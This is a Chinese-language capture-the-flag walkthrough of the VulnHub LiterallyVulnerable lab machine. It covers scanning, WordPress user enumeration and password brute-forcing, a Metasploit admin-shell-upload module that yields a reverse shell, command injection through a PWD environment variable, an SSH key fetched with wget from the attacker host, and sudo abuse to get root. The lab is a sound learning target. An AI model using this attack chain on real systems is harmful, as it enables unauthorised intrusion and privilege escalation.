# vulnhub之LiterallyVulnerable的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746408&idx=1&sn=b1b83241f25a3c8cbf6ff5723384aefd&chksm=87148f28b063063e1f60ddee269da421d214e515fc03ef98acc064914e054cb05e2e590f0fb8&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746408&idx=1&sn=b1b83241f25a3c8cbf6ff5723384aefd&chksm=87148f28b063063e1f60ddee269da421d214e515fc03ef98acc064914e054cb05e2e590f0fb8&scene=27#wechat_redirect)

本周末实践的是vulnhub的LiterallyVulnerable镜像，下载地址，https://download.vulnhub.com/ua/LiterallyVulnerable.7z，

用workstation打开，能扫描到地址，

sudo netdiscover -r 192.168.137.0/24，

![](../Images/be8053c540980a8753484407a7e33e4b.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.137.212，

![](../Images/19894bc417ba6b7539be0e33fcc10169.png)

发现ftp可匿名登录，进去看看，

![](../Images/90c0e93fcd04b66ec7c269cc4da73c0d.png)

查看下载到的文件内容，

![](../Images/96766d538c02fbf0cad9bee28fd5eaa7.png)

看提示，某个账号的密码应该在这里，先留着，

对80端口做目录扫描没有结果，对65535端口做目录扫描，

sudo dirb http://192.168.137.212:65535/ /usr/share/wordlists/dirb/big.txt，

![](../Images/b33c716a6748d7f8c0e64567fcb49ec6.png)

登录时发现需要本地添加一下域名的解析才能正常访问，

/etc/hosts，192.168.137.212 literally.vulnerable，

![](../Images/6c25c166d14d9c5404d05c1abf998246.png)

继续做账户扫描，

sudo wpscan --url http://192.168.137.212:65535/phpcms/ -e u，

![](../Images/d48b4733066bd5f06f2c52fdb97e8426.png)

得到两个账户，maybeadmin，notadmin，放user.txt里，

再把之前得到的密码文件当密码字典，开始爆破，

sudo wpscan --url http://192.168.137.212:65535/phpcms/ -U user.txt -P backupPasswords，

![](../Images/a4ee66d3f93762467443bd58e267b5b6.png)

得到了maybeadmin/$EPid%J2L9LufO5，

登录后台，发现了另一个账户的密码，

![](../Images/ac0bd7cdf55d12d53903b74a1f7da86b.png)

再用notadmin/Pa$$w0rd13!&登录后台，发现它是管理员，

那就可以上传webshell了，

use exploit/unix/webapp/wp\_admin\_shell\_upload  
set RHOSTS 192.168.137.212  
set RPORT 65535  
set TARGETURI /phpcms  
set USERNAME notadmin  
set PASSWORD Pa$$w0rd13!&  

![](../Images/1fb972e3e0aa9add6e6e946f8df5bab1.png)

得到反弹shell，不是root，需要提权，

![](../Images/603e5a9f5d6f0f044ea89afb7afee74c.png)

发现/home/doe/itseasy可以提权，进目录执行./itseasy发现echo的当前路径，通过改环境变量pwd无效，后来是看人家的writeup，说是要用IDA反编译itseasy文件，从源码里能看到环境变量是大写的PWD，

于是export PWD=\\$\\(/bin/bash\\)，再次执行./itseasy，

![](../Images/0aa53b3d97ec70fdefc61414f4e2e9a0.png)

这就提权到了john账号，还不是root，需要继续提权，而且当前shell下执行命令都没有回显，想到ssh重新登录一下，

在kali攻击机上创建rsa密钥对儿，  

ssh-keygen  
cd .ssh  
ls  
cat id\_rsa.pub > authorized\_keys

开启http下载，python -m SimpleHTTPServer，

从靶机上把公钥下载过去，

mkdir /home/john/.ssh，  
cd /home/john/.ssh && wget http://192.168.137.28:8000/authorized\_keys，

![](../Images/5ed998f554f005bd2b072d88718f5497.png)

这就能重新用ssh登录进去了，这回命令有回显了，

查找跟john账户有关系的文件，find / -group john 2>/dev/null，

![](../Images/f54c48c1bc49954bc5d3806076d4e66b.png)

看到myPssword文件，查看内容，提示是base64编码的，那就解码，

echo am9objpZWlckczhZNDlJQiNaWko= | base64 -d，

sudo -l看到/var/www/html/test.html是root权限执行的，

当前账号创建/var/www/html/test.html说没权限，

回到刚开始反弹shell那个账户，发现有权限创建，

echo "/bin/bash" > test.html，chmod 777 test.html，

再回到john账户下，sudo /var/www/html/test.html，

id看一下，嗯，是root，

![](../Images/5a8e049807fa38c324da3d0a49f78942.png)
